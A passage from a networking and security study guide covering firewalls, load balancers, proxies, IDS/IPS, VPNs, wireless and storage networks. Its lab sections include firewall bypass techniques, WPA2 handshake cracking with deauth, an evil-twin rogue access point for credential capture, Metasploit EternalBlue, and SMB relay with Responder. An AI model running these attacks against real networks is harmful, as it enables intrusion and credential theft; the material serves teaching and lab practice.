    ip6 nexthdr icmpv6 accept
    
    # Log and drop everything else
    log prefix "nft-drop: " drop
  }
  
  chain forward {
    type filter hook forward priority 0; policy drop;
  }
  
  chain output {
    type filter hook output priority 0; policy accept;
  }
}
EOF

sudo nft -f /etc/nftables.conf
```

### Firewall Bypass Techniques (For Lab/Pentest Learning)

```
1. Port knocking bypass:
   Firewall blocks SSH (22) by default
   Send SYN to ports 7000, 8000, 9000 in sequence
   Firewall opens port 22 for your IP for 30 seconds
   
   Client: knock 192.168.1.100 7000 8000 9000 && ssh user@192.168.1.100
   
2. IPv6 bypass:
   Firewall has rules only for IPv4
   Connect via IPv6 → completely bypasses IPv4 rules
   
3. Fragmentation:
   Split malicious payload across multiple fragments
   Stateless firewall checks each fragment independently
   Reassembled payload is malicious
   fragroute tool handles this
   
4. Protocol tunneling:
   SSH tunneling: ssh -D 1080 user@192.168.1.100  (SOCKS proxy through SSH)
   DNS tunneling: all data in DNS queries (see Section 1)
   ICMP tunneling: ptunnel tool
   HTTP CONNECT: proxy traversal for any protocol
   
5. Application layer bypass:
   HTTP on port 443 looks like HTTPS to port-based rules
   NGFW App-ID detects this; packet-filter firewalls don't
```

---

## 19. Load Balancers

### Layman's Terms
A load balancer is the **traffic cop at a toll plaza** with multiple booths. Instead of everyone queuing at one booth (one server), the cop directs cars to whichever booth has the shortest line, is available, or is best suited for the car type (trucks to wider lanes, motorcycles to narrow lanes).

### Formal Definition
A load balancer is a device (hardware or software) that distributes incoming network traffic across multiple backend servers to ensure no single server is overwhelmed, improve reliability and availability, and enable horizontal scaling.

### Load Balancer Types

```
L4 Load Balancer (Transport Layer):
  Forwards based on: IP, TCP/UDP port
  No content inspection — pure connection routing
  Very fast (hardware ASIC possible)
  Protocol-agnostic: works for any TCP/UDP service
  
  Examples: AWS Network Load Balancer (NLB), HAProxy (TCP mode),
            F5 BIG-IP (TCP mode), LVS (Linux Virtual Server)
  
  Mechanism: DNAT to backend, SNAT for responses
  NAT mode: client → LB → backend (LB changes dst IP)
  DR mode:  all backends share same VIP MAC (no SNAT needed)

L7 Load Balancer (Application Layer):
  Forwards based on: HTTP headers, URL, cookies, body content
  Content-aware routing (SSL offloading, session persistence)
  Can modify requests/responses (add headers, rewrite URLs)
  Higher CPU overhead than L4
  
  Examples: AWS Application Load Balancer (ALB), Nginx, HAProxy (HTTP mode),
            Traefik, Envoy, Istio
```

### Load Balancing Algorithms

```
1. ROUND ROBIN (default):
   Request 1 → Server A
   Request 2 → Server B
   Request 3 → Server C
   Request 4 → Server A  (repeat)
   
   Problem: Server A might be slower. Equal distribution ≠ equal load.
   
2. WEIGHTED ROUND ROBIN:
   Server A weight 3: gets 3x more requests
   Server B weight 1: gets 1x requests
   Use case: Servers with different capacity

3. LEAST CONNECTIONS:
   Route to server with fewest active connections
   Better for variable request duration (some requests take 1ms, some 10s)
   
4. LEAST RESPONSE TIME:
   Route to server with lowest avg response time
   Best for performance-sensitive applications
   
5. IP HASH (Source IP Affinity):
   Hash(client IP) % num_servers = always same server
   Ensures client always hits same server (session persistence)
   Problem: uneven distribution if some IPs are busy corporations
   
6. RANDOM:
   Random server selection
   Works well at scale (law of large numbers)
   
7. RESOURCE-BASED (Adaptive):
   Health agent on server reports current CPU/mem/connections
   LB routes to least-loaded server
   Most intelligent but requires agent
   
Consistent Hashing (Distributed Systems):
  Used in microservices and caching layers
  Adding/removing servers only redistributes ~1/N of requests
  Used by: Amazon DynamoDB, Apache Cassandra, CDN edge selection
```

### Session Persistence (Sticky Sessions)

```
Problem: User logs in → hits Server A, session stored in A's memory
         Next request → LB sends to Server B → "Not logged in!"
         
Solutions:

1. STICKY SESSIONS (Cookie-based):
   LB sets a cookie: Set-Cookie: SERVERID=A; Path=/
   All subsequent requests with this cookie → Server A
   Risk: Uneven load (all users who logged in early → same server)
   
2. STICKY SESSIONS (Source IP):
   IP hash (above) — same IP always → same server
   Risk: corporate NAT → thousands of users behind one IP → one server
   
3. SHARED SESSION STORAGE (Best practice):
   App stores sessions in Redis/Memcached, not in-memory
   Any server can serve any request — LB is truly stateless
   Netflix, Google, Amazon all use this pattern
   
4. JWT/Token-based auth:
   Stateless by design — token contains all session info
   No session storage needed → perfect for microservices/Kubernetes
```

### SSL/TLS Offloading

```
SSL Offloading: LB terminates TLS, forwards plain HTTP to backends

                 HTTPS                     HTTP
  Client ──────────────────►  LB  ──────────────────► Backends
         TLS 1.3 encrypted        Plain HTTP
         Certificate at LB         (internal network only)

Benefits:
  - Backends don't need certificates or TLS processing overhead
  - LB can inspect/modify HTTP content (WAF, header injection)
  - Centralized certificate management
  - Backend servers only handle HTTP (simpler config)

Security concern:
  Traffic between LB and backends is unencrypted!
  Must ensure backend network is trusted (private subnet)
  
SSL Passthrough:
  LB forwards encrypted traffic to backends without decrypting
  Backend handles TLS termination
  LB can only route based on SNI (Server Name Indication) header
  Use case: End-to-end encryption required (PCI-DSS, HIPAA)
  
SSL Bridging (Re-encryption):
  LB decrypts, inspects, re-encrypts to backend
  Both external and internal traffic encrypted
  LB needs both public cert (for clients) and backend cert (for servers)
  Most secure but highest overhead
```

### Load Balancer Health Checks

```
Health check types:
  TCP: Connect to port, expect TCP handshake → server alive
  HTTP: GET /health → expect HTTP 200 → app alive
  HTTPS: Same as HTTP but TLS
  Custom: Run script, check response body, check DB connectivity

Health check behavior:
  Interval: How often to check (default: 30s)
  Threshold: How many failures before removing (default: 2)
  Timeout: How long to wait for response (default: 5s)
  Recovery: How many successes to re-add (default: 2)

Real-world health endpoint (what to check):
  GET /healthz should verify:
    - Application is running
    - Database connection works
    - Cache connection works
    - Critical external APIs reachable
  Return: 200 OK + JSON status
  Do NOT return 200 if dependencies are broken!

Kubernetes liveness vs readiness probes:
  Liveness:  Is container alive? (failure → restart container)
  Readiness: Is container ready to serve? (failure → remove from LB)
  
  livenessProbe:
    httpGet:
      path: /healthz
      port: 8080
    initialDelaySeconds: 30
    periodSeconds: 10
    
  readinessProbe:
    httpGet:
      path: /ready
      port: 8080
    periodSeconds: 5
```

### Load Balancer Attacks

| Attack | Description | Mitigation |
|--------|-------------|-----------|
| **Slow HTTP / Slowloris** | Open many connections, send data very slowly, exhaust connection table | Connection timeout, max connection limits |
| **SSL Renegotiation Attack** | Request repeated TLS renegotiations, exhaust server CPU | Disable client-initiated renegotiation |
| **HTTP/2 Rapid Reset** | Send HEADERS + RST_STREAM repeatedly (CVE-2023-44487) | Rate limit RST, patch servers |
| **Backend SSRF via LB** | Trick LB to forward requests to internal backends not meant to be public | Strict backend routing, disable debug endpoints |
| **Session Fixation via Cookie** | Predict or force SERVERID cookie to target specific backend | Cryptographically random session IDs |

---

## 20. Proxy Servers

### Layman's Terms
A proxy is your **personal assistant** who makes internet requests on your behalf. When you want to visit a website, you ask your assistant (proxy), the assistant visits the site for you, gets the response, and gives it to you. The website only sees the assistant's identity — not yours.

### Types of Proxies

```
FORWARD PROXY (client-side, most common):
  Client → Proxy → Internet
  Client is aware of proxy (configured in browser/OS)
  Use cases: Content filtering, caching, anonymization
  Examples: Squid, NGINX (forward mode), corporate web proxies

TRANSPARENT PROXY (intercepting):
  Client → Router → (Intercepts silently) Proxy → Internet
  Client is NOT aware of proxy (no configuration needed)
  Traffic redirected by firewall (WCCP or TPROXY)
  Use cases: ISP content filtering, enterprise monitoring
  
REVERSE PROXY (server-side):
  Internet → Reverse Proxy → Backend Servers
  Clients think they're talking directly to the server
  Server is aware of proxy, clients are not
  Use cases: Load balancing, SSL offloading, WAF, caching
  Examples: Nginx, HAProxy, Envoy, AWS ALB, Cloudflare

SOCKS PROXY:
  Generic proxy at Layer 5 — works for any TCP/UDP
  SOCKS4: TCP only
  SOCKS5: TCP, UDP, authentication, IPv6
  Use cases: Tor, SSH tunneling, bypassing firewalls
  ssh -D 1080 user@jumphost  (creates SOCKS5 proxy via SSH)
```

### Proxy Chaining (Pentest Relevance)

```
Proxy chains route traffic through multiple proxies:
  Attacker → Proxy 1 → Proxy 2 → Proxy 3 → Target
  
Each proxy only sees previous hop — harder to trace back to attacker.
Tor uses onion routing (layered encryption version of proxy chaining).

Proxychains tool (Linux):
  sudo apt install proxychains4

  # Edit /etc/proxychains4.conf:
  [ProxyList]
  socks4  127.0.0.1  9050    # Tor
  socks5  192.168.1.100 1080  # Additional proxy

  # Use with any tool:
  proxychains4 nmap -sT 192.168.1.200
  proxychains4 curl http://target.com
  proxychains4 sqlmap -u "http://target.com/vuln?id=1"

  # Dynamic chain: use available proxies in order, skip dead ones
  # Strict chain: ALL proxies must work
  # Random chain: randomize order (more anonymous)
```

### Web Proxy for Security Testing (Burp Suite Architecture)

```
Burp Suite as Man-in-the-Middle Proxy:

Browser ──HTTP/HTTPS──► Burp Proxy (127.0.0.1:8080) ──► Server

Configure browser proxy → 127.0.0.1:8080
Install Burp CA certificate → Burp can decrypt HTTPS

Burp decrypts TLS → intercepts, modifies → re-encrypts → forwards

Key Burp modules:
  Proxy:     Intercept and modify requests/responses
  Repeater:  Manually replay and modify single requests
  Intruder:  Automated attack with payload lists (fuzzing)
  Scanner:   Automated vulnerability discovery
  Decoder:   Encode/decode Base64, URL, HTML, hex
  Comparer:  Diff two requests/responses
  
Lab setup:
  sudo apt install burpsuite
  burpsuite &
  # Set proxy: 127.0.0.1:8080
  # Export CA cert: Proxy → Options → CA Certificate
  # Import to browser certificate store
```

### Content Filtering Proxy (Squid)

```bash
# Install and configure Squid proxy
sudo apt install squid -y

# Key squid.conf directives
cat >> /etc/squid/squid.conf << 'EOF'
# Listen port
http_port 3128

# Deny access to malicious sites
acl blocklist dstdomain .malware.com .phishing.com
http_access deny blocklist

# Block CONNECT method to non-HTTPS ports (security)
acl SSL_ports port 443
acl CONNECT method CONNECT
http_access deny CONNECT !SSL_ports

# Only allow internal network
acl internal_network src 192.168.1.0/24
http_access allow internal_network

# Log all requests (forensic value)
access_log /var/log/squid/access.log combined

# Cache settings
cache_mem 256 MB
maximum_object_size 100 MB
cache_dir ufs /var/spool/squid 10000 16 256
EOF

sudo systemctl restart squid

# Analyze Squid logs (find most visited sites)
sudo awk '{print $7}' /var/log/squid/access.log | \
  sed 's|https?://||' | cut -d'/' -f1 | sort | uniq -c | sort -rn | head 20

# Force transparent proxy via iptables:
sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 \
  -j REDIRECT --to-port 3128
```

---

## 21. IDS / IPS

### Layman's Terms
An **IDS (Intrusion Detection System)** is a **security camera** — it watches everything and alerts you when something suspicious happens, but doesn't act. An **IPS (Intrusion Prevention System)** is a **security guard** — it also watches, but it physically blocks suspicious activity (drops packets, blocks connections) in real time.

### IDS vs IPS Architecture

```
IDS — Out-of-Band (Passive):
  Network Switch (SPAN/mirror port) → IDS
  Traffic copy sent to IDS — original traffic unaffected
  IDS analyzes, generates alerts
  Cannot block — only detect
  Benefit: no latency impact on production traffic
  
IPS — In-Line (Active):
  Network → [IPS] → Network
  IPS sits in the packet path
  Can: DROP packets, RESET connections, BLOCK IPs
  Risk: IPS failure = network outage (bypass mode critical)
  Modern IPS: fail-open (bypass on hardware failure)
```

### Detection Methods

```
1. SIGNATURE-BASED DETECTION:
   Pattern matching against known attack signatures
   Example: HTTP request contains "1=1 OR" = SQL injection rule
   
   Pros: Accurate for known attacks, low false positives
   Cons: Useless against zero-days, requires constant updates
   
   Snort rule syntax:
   alert tcp any any -> 192.168.1.0/24 80 (
     msg:"SQL Injection attempt";
     flow:to_server,established;
     content:"1=1";
     nocase;
     sid:1000001;
     rev:1;
   )

2. ANOMALY-BASED DETECTION:
   Baseline normal behavior → alert on deviations
   "This server usually gets 100 requests/min, now it's getting 10,000"
   "This user never logs in at 3am from Russia"
   
   Pros: Can detect zero-days and novel attacks
   Cons: High false positive rate during initial learning
   
   Machine learning-based: Darktrace, Vectra AI
   Behavioral analytics: Splunk UBA, Microsoft Sentinel UEBA

3. POLICY/PROTOCOL-BASED:
   Verify traffic conforms to protocol RFCs
   Malformed packet → alert (evasion attempt or bug)
   
4. REPUTATION-BASED:
   Threat intelligence feeds with known malicious IPs, domains
   Real-time blocklists (Talos, Emerging Threats, Crowdstrike)
```

### Snort IDS/IPS Lab

```bash
# Install Snort 3
sudo apt install snort3 -y

# Test Snort with community rules
sudo snort -c /etc/snort/snort.lua --plugin-path /usr/lib64/snort \
  -i eth0 -A alert_fast

# Download community rules
sudo wget -O /etc/snort/community.rules \
  https://www.snort.org/downloads/community/community-rules.tar.gz

# Write custom rule to detect nmap port scan:
echo 'alert tcp any any -> any any (
  msg:"NMAP SYN Scan Detected";
  flags:S;
  threshold:type both,track by_src,count 20,seconds 1;
  sid:9000001;
  rev:1;
)' | sudo tee /etc/snort/rules/local.rules

# Start Snort in IPS mode (inline, drops matched packets)
sudo snort -c /etc/snort/snort.lua -i eth0 -Q --daq nfq

# Suricata (modern alternative, faster, multi-thread)
sudo apt install suricata -y
sudo suricata-update  # Download latest rules
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# View alerts:
tail -f /var/log/suricata/fast.log
tail -f /var/log/suricata/eve.json | python3 -m json.tool
```

---

## 22. VPN Gateways

### Layman's Terms
A VPN (Virtual Private Network) creates a **secure encrypted tunnel** through the public internet — like building a private underground tunnel between two buildings even though they're in different cities. Everything inside the tunnel is encrypted and private, even though it travels through public infrastructure.

### VPN Types & Protocols

```
1. SITE-TO-SITE VPN:
   Office A (10.0.1.0/24) ═══[Encrypted Tunnel]═══ Office B (10.0.2.0/24)
   VPN gateways at each site handle encryption/decryption
   Users transparent — routes handle it automatically
   
   Protocols: IPsec (most common), GRE+IPsec, DMVPN, SD-WAN
   
2. REMOTE ACCESS VPN:
   Road warrior (laptop) ══[Encrypted Tunnel]══ Corporate HQ
   Client software on laptop
   Protocols: SSL VPN (HTTPS-based), IPsec IKEv2, WireGuard, OpenVPN
   
3. CLIENTLESS SSL VPN:
   Browser ──HTTPS──► VPN Gateway (portal)
   No client install, access specific internal web apps only
   Often used for contractors, BYOD

IPsec Architecture (deep):
  Two phases:
  
  Phase 1 (IKE SA — Management Tunnel):
    Authenticate peers (PSK or certificates)
    Agree on encryption: AES-256, SHA-256, DH Group 14+
    Create secure channel for Phase 2 negotiation
    
  Phase 2 (IPsec SA — Data Tunnel):
    Negotiate actual data encryption
    Create Security Associations (SA) for each direction
    SAs stored in Security Association Database (SAD)
    Rules in Security Policy Database (SPD)
    
  IPsec Modes:
    Transport Mode: Only payload encrypted, original IP header visible
                    Used: host-to-host
    Tunnel Mode:    Entire original packet encrypted + new IP header added
                    Used: gateway-to-gateway (standard site-to-site)
    
  IPsec Protocols:
    AH (Authentication Header): Integrity + anti-replay, NO encryption
    ESP (Encapsulating Security Payload): Integrity + anti-replay + ENCRYPTION
    Always prefer ESP over AH in practice
```

### WireGuard — Modern VPN Protocol

```
WireGuard is the modern VPN protocol designed for simplicity and speed.

Why WireGuard > OpenVPN/IPsec:
  OpenVPN: ~100,000 lines of code (large attack surface)
  IPsec:   Complex IKE negotiation, many config options → misconfiguration risk
  WireGuard: ~4,000 lines of code, uses modern crypto only
  
Crypto: ChaCha20 (encryption), Poly1305 (authentication),
        Curve25519 (key exchange), BLAKE2s (hashing)

No negotiation: no IKE, no certificates, just pre-shared keys
Connection: stateless — peers exchange public keys, connect when packet arrives
Performance: near line-speed (in Linux kernel)

WireGuard Lab Setup:
# Server side (VPN gateway)
sudo apt install wireguard -y
wg genkey | tee server-private.key | wg pubkey > server-public.key

cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat server-private.key)
Address = 10.10.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = CLIENT_PUBLIC_KEY_HERE
AllowedIPs = 10.10.0.2/32
EOF

sudo systemctl enable --now wg-quick@wg0
sudo wg show  # Check status

# Client side
wg genkey | tee client-private.key | wg pubkey > client-public.key

cat > /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat client-private.key)
Address = 10.10.0.2/24

[Peer]
PublicKey = SERVER_PUBLIC_KEY_HERE
Endpoint = SERVER_IP:51820
AllowedIPs = 0.0.0.0/0  # Route all traffic through VPN
PersistentKeepalive = 25
EOF

sudo wg-quick up wg0
```

---

## 23. Wireless Access Points

### Layman's Terms
A Wireless Access Point (WAP) is a **wireless version of a network switch port** — it lets devices connect to the network without cables. It converts Wi-Fi radio signals (L1) to Ethernet frames (L2) and vice versa.

### Wi-Fi Standards Evolution

| Standard | Year | Max Speed | Frequency | Notes |
|----------|------|-----------|-----------|-------|
| 802.11a | 1999 | 54 Mbps | 5 GHz | First 5GHz, limited adoption |
| 802.11b | 1999 | 11 Mbps | 2.4 GHz | Mass adoption started here |
| 802.11g | 2003 | 54 Mbps | 2.4 GHz | Backward compat with b |
| 802.11n (Wi-Fi 4) | 2009 | 600 Mbps | 2.4/5 GHz | MIMO (multiple antennas) |
| 802.11ac (Wi-Fi 5) | 2013 | 3.5 Gbps | 5 GHz | MU-MIMO, beamforming |
| 802.11ax (Wi-Fi 6) | 2019 | 9.6 Gbps | 2.4/5 GHz | OFDMA, BSS Coloring |
| 802.11ax (Wi-Fi 6E) | 2020 | 9.6 Gbps | 6 GHz | New 6GHz band (less congestion) |
| 802.11be (Wi-Fi 7) | 2024 | 46 Gbps | 2.4/5/6 GHz | MLO (multi-link operation) |

### Wi-Fi Security Protocols

```
WEP (Wired Equivalent Privacy) — DEAD, never use:
  RC4 stream cipher with 40/104-bit keys
  Fatal flaw: reuses IVs (Initialization Vectors)
  Cracked in minutes with 50,000 packets
  Tool: aircrack-ng
  
WPA (Wi-Fi Protected Access) — Legacy:
  TKIP (Temporal Key Integrity Protocol) — RC4 with per-packet key
  Still vulnerable to TKIP attacks
  
WPA2 — Current standard (2004–present):
  CCMP/AES (Counter Mode CBC-MAC Protocol)
  Two modes:
    Personal (WPA2-PSK):  Pre-shared key (password-based)
    Enterprise (WPA2-802.1X): RADIUS authentication
    
  WPA2-PSK vulnerability (PMKID attack, 2018):
    No need to capture 4-way handshake anymore
    AP broadcasts PMKID — can directly attempt offline dictionary attack
    Tool: hcxdumptool + hashcat
    
WPA3 — Current generation (2018+):
  Personal:   SAE (Simultaneous Authentication of Equals)
              Password-authenticated key exchange — no offline dictionary attacks
              Forward secrecy per session
  Enterprise: Suite-B cryptography (192-bit)
  Transition: WPA3 AP can support WPA2/WPA3 simultaneously
  
WPA3 vulnerabilities (Dragonblood, 2019):
  Side-channel attacks on SAE handshake
  Downgrade attacks forcing WPA2
  Mostly patched but shows WPA3 is not perfect
```

### Wi-Fi Attack Lab (WPA2 Handshake Capture)

```bash
# Environment: Kali Linux + wireless adapter with monitor mode support
# IMPORTANT: Only attack networks you own or have explicit permission to test

# Step 1: Check wireless interface
iwconfig
ip link show

# Step 2: Enable monitor mode
sudo airmon-ng start wlan0
# Interface is now wlan0mon

# Kill conflicting processes
sudo airmon-ng check kill

# Step 3: Discover nearby networks
sudo airodump-ng wlan0mon
# Note target BSSID and channel

# Step 4: Capture handshake on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6 = channel 6, change to your target's channel
# Wait for a client to connect (or deauth them to force reconnect)

# Step 5: Deauth attack to force handshake capture
# (In separate terminal — target must have connected clients)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# -a = AP BSSID, 10 deauth frames sent

# Step 6: Crack the captured handshake
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# Alternative: PMKID attack (no deauth needed)
sudo apt install hcxdumptool hcxtools -y
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
sudo hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Return interface to managed mode when done
sudo airmon-ng stop wlan0mon
```

### Evil Twin Attack Lab

```bash
# Create rogue AP mimicking legitimate network
# Requires: hostapd, dnsmasq

# Create hostapd config (fake AP)
cat > /tmp/evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetworkName
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/evil-twin.conf &

# Give fake AP an IP
sudo ip addr add 192.168.1.1/24 dev wlan0
sudo ip link set wlan0 up

# Set up fake DHCP
cat > /tmp/evil-dhcp.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
EOF
sudo dnsmasq -C /tmp/evil-dhcp.conf

# Enable forwarding + internet sharing (make it convincing)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Now capture credentials with SSLstrip or mitmproxy
sudo mitmproxy -p 8080 --mode transparent
```

---

## 24. Wireless LAN Controllers (WLC)

### Layman's Terms
In a large building with 200 Wi-Fi access points, you can't configure each one manually. A Wireless LAN Controller is the **central brain** that manages all APs — pushing config, monitoring performance, handling roaming between APs, and managing radio frequencies.

### Formal Definition
A Wireless LAN Controller (WLC) is a network device that centralizes the management and control of multiple lightweight access points (LAPs) via the CAPWAP protocol. It handles AP provisioning, RF management, client roaming, authentication, and security policy enforcement from a single management plane.

### Controller vs Autonomous AP Architecture

```
AUTONOMOUS AP (Fat AP / Traditional):
  Each AP manages itself
  Config: per-AP (SSH, web GUI, CLI)
  Intelligence: in the AP
  Scale: hard to manage >10 APs
  Roaming: client must re-authenticate on every AP
  
CONTROLLER-BASED AP (Thin/Lightweight AP):
  AP = radio hardware only (no local intelligence)
  Controller: all intelligence centralized
  Config: push from controller to all APs simultaneously
  Scale: thousands of APs managed from one controller
  Roaming: seamless (controller handles session continuity)
  
CAPWAP (Control and Provisioning of Wireless Access Points):
  RFC 5415 — how controller talks to APs
  Port 5246 (UDP) — control channel (encrypted)
  Port 5247 (UDP) — data channel (optionally encrypted)
  
  Two modes:
  Centralized (Local mode): All client data tunneled to controller
    AP ──CAPWAP data tunnel──► WLC ──► Internet
    Latency issue for large deployments
    
  FlexConnect (Split mode): Local data, centralized control
    AP ──CAPWAP control──► WLC
    Client data ──directly──► local network (no hairpin to WLC)
    Better for branch offices
```

### Cisco WLC Security Features

```
Rogue AP Detection:
  Monitor mode APs scan all channels
  Report unrecognized APs to WLC
  WLC compares against known AP list
  Alert if unauthorized AP found
  
  Rogue AP containment (active defense):
  WLC sends deauth frames to rogue AP's clients
  (Controversial — some call it illegal in some jurisdictions)
  
Client Isolation:
  Wireless clients cannot communicate with each other
  Each client isolated in separate VLAN or IP
  Essential for hotel/public Wi-Fi
  
WPA2-Enterprise + RADIUS:
  WLC ──RADIUS──► ISE/FreeRADIUS
  Each user gets unique credentials
  No shared PSK
  802.1X EAP methods:
    EAP-TLS: Client certificate (strongest)
    PEAP: Username/password in TLS tunnel
    EAP-FAST: Cisco proprietary, fast re-auth
```

---

## 25. Network Attached Storage (NAS)

### Layman's Terms
A NAS is a **dedicated file server box** connected to your network. It's like a shared hard drive that anyone on the network can access. The box has multiple hard drives, its own CPU/RAM, and speaks standard file sharing protocols.

### Formal Definition
Network Attached Storage (NAS) is a file-level storage device connected to a network that provides file-based data storage services to other devices on the network. NAS devices use standard file sharing protocols (NFS, SMB/CIFS, AFP) and present storage as a shared filesystem rather than as block storage.

### NAS Protocols Deep Dive

```
SMB / CIFS (Server Message Block):
  Port: 445 (TCP), 137-139 (TCP/UDP, legacy NetBIOS)
  Used by: Windows clients (primary), macOS, Linux (via Samba)
  Auth: NTLM, Kerberos (with Active Directory)
  Versions:
    SMBv1: Vulnerable (EternalBlue MS17-010, WannaCry) — NEVER use
    SMBv2: 2008, significant improvements
    SMBv3: 2012, encryption, multichannel
    SMBv3.1.1: 2016, pre-auth integrity checks
  
  Samba (Linux SMB server):
  sudo apt install samba -y
  cat >> /etc/samba/smb.conf << 'EOF'
  [shared]
    path = /srv/samba/shared
    read only = no
    browsable = yes
    valid users = @smbgroup
    create mask = 0664
    directory mask = 0775
  EOF
  
  Security hardening:
    min protocol = SMB2         # Never SMB1
    server signing = mandatory  # Prevent MITM/relay attacks
    encrypt passwords = yes
    
NFS (Network File System):
  Port: 2049 (TCP/UDP)
  Used by: Linux/Unix clients
  Versions:
    NFSv3: Stateless, UDP-based, no auth (host-based only)
    NFSv4: Stateful, TCP-only, Kerberos auth, ACLs
    NFSv4.1/4.2: pNFS (parallel NFS for performance)
    
  Security issues:
    NFSv3 uses host-based auth (IP = trust) — easily spoofed
    NFSv3 UID/GID mapping — if client controls UID 0, they're root on NFS
    Exports misconfiguration: exporting / with no_root_squash = game over
    
  Dangerous export:
    /etc/exports: /data *(rw,no_root_squash)  ← ANY HOST, ROOT ACCESS
    
  Secure export:
    /etc/exports: /data 192.168.1.0/24(rw,root_squash,sync,no_subtree_check)
```

### NAS Security Attacks

```
1. EternalBlue (MS17-010) against SMB:
   Affects Windows SMB, but Samba versions also affected by related bugs
   sudo msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 192.168.1.50
   exploit
   
2. NFS Unauthorized Mount:
   Check if NFS exports are open:
   showmount -e 192.168.1.50
   
   If you see: /data *   (world-readable)
   mkdir /tmp/nfs-mount
   mount -t nfs 192.168.1.50:/data /tmp/nfs-mount
   # Now you have full access to NFS share
   
3. SMB Relay Attack:
   No need to crack hashes — relay captured NTLM hash to another server
   Responder captures NTLM, ntlmrelayx forwards to target
   
   sudo responder -I eth0 -rdwv
   sudo ntlmrelayx.py -tf targets.txt -smb2support
   # Browse to a UNC path on victim machine → hash captured → relayed

4. Ransomware via SMB:
   WannaCry spread entirely via SMB → encrypted NAS shares
   Defense: Disable SMB1, firewall 445 from internet, immutable backups
```

---

## 26. Storage Area Networks (SAN)

### Layman's Terms
If NAS is a **shared filing cabinet** (file-level), a SAN is a **dedicated storage highway** — it connects servers directly to storage at the block level (like SCSI drives but over the network). Servers see SAN storage as if it were a locally attached disk.

### Formal Definition
A Storage Area Network (SAN) is a high-speed, dedicated network that provides block-level access to storage devices. Servers connect to SAN storage via Fibre Channel (FC), iSCSI, or FCoE and see the storage as a locally attached block device, independent of the LAN.

### SAN vs NAS Comparison

```
                     NAS                    SAN
─────────────────────────────────────────────────────────
Access type:     File-level             Block-level
Protocols:       NFS, SMB, AFP          FC, iSCSI, FCoE
Network:         Standard Ethernet/LAN  Dedicated SAN fabric
Shared by:       Multiple clients       Typically one server
Performance:     Medium                 High (low latency)
Cost:            Low to medium          High
Typical use:     File sharing, backup   Databases, VMs, OS boot
Appears as:      Filesystem             Disk drive (e.g., /dev/sdb)
```

### SAN Protocols

```
FIBRE CHANNEL (FC):
  Dedicated SAN fabric (not Ethernet)
  Speeds: 2, 4, 8, 16, 32, 64 Gbps
  Components:
    HBA (Host Bus Adapter) — FC card in server
    FC Switch — dedicated SAN switch (e.g., Brocade, Cisco MDS)
    Storage array with FC ports
  Addressing:
    WWN (World Wide Name) — 64-bit, like MAC address for FC
    WWPN (Port), WWNN (Node)
  Zoning:
    Hard Zoning: Port-based (more secure)
    Soft Zoning: WWN-based (easier to manage)
    Security: Prevent unauthorized servers from seeing storage LUNs

iSCSI (Internet SCSI):
  FC over TCP/IP — SCSI commands in TCP packets
  Port: 3260 (TCP)
  Cheaper than FC (uses standard Ethernet)
  Components: iSCSI initiator (client software), iSCSI target (storage)
  
  Linux iSCSI setup:
  sudo apt install open-iscsi -y
  
  # Discover targets
  sudo iscsiadm -m discovery -t st -p 192.168.1.200
  
  # Login to target
  sudo iscsiadm -m node --login
  
  # New block device appears: /dev/sdb
  sudo fdisk -l /dev/sdb

FCoE (Fibre Channel over Ethernet):
  FC frames encapsulated in Ethernet (10GbE+)
  Converged network: FCoE + regular Ethernet on same cable
  Lossless Ethernet required (DCB - Data Center Bridging)
  Fewer cables, lower cost than dedicated FC fabric
```

### SAN Security

```
SAN security is often overlooked — critical vulnerability:
  
1. LUN MASKING (Access Control):
   Storage array presents specific LUNs only to authorized servers
   Based on WWN/iSCSI IQN
   
2. FC ZONING:
   FC switch enforces which HBAs can communicate with which storage ports
   Without zoning: any server can see any storage (catastrophic)
   
3. iSCSI SECURITY RISKS:
   CHAP authentication: shared secret — brute-forceable
   No encryption by default — SCSI commands in cleartext over LAN
   Attacker on same LAN can intercept iSCSI traffic
   
   Enable IPsec for iSCSI encryption:
   ipsec.conf: conn iscsi-storage
                 left=192.168.1.10
                 right=192.168.1.200
                 auto=start
                 
4. BOOT FROM SAN attacks:
   If server boots from SAN LUN, attacker with SAN access
   can modify OS disk — completely owns the server
   Physical security of SAN switches is critical
```

---

## 27. Content Delivery Networks (CDN)

### Layman's Terms
A CDN is a **global network of convenience stores**. Instead of everyone in Tokyo driving to a grocery warehouse in New York for a product, a local store in Tokyo stocks the most popular items. CDNs cache your website's content on servers worldwide so users always load from the nearest location.

### Formal Definition
A Content Delivery Network is a geographically distributed network of proxy servers and data centers that deliver web content and media to users based on their geographic location, minimizing latency by serving content from the nearest edge node.

### CDN Architecture

```
Without CDN:
  User in Tokyo → DNS → Origin server (New York) → 150ms RTT

With CDN:
  User in Tokyo → DNS → CDN PoP in Tokyo → 5ms RTT
                         (cached content served locally)
                         
CDN Components:
  Origin Server:  Your actual web server (in US, EU, wherever)
  Edge Nodes (PoP - Points of Presence): CDN servers worldwide
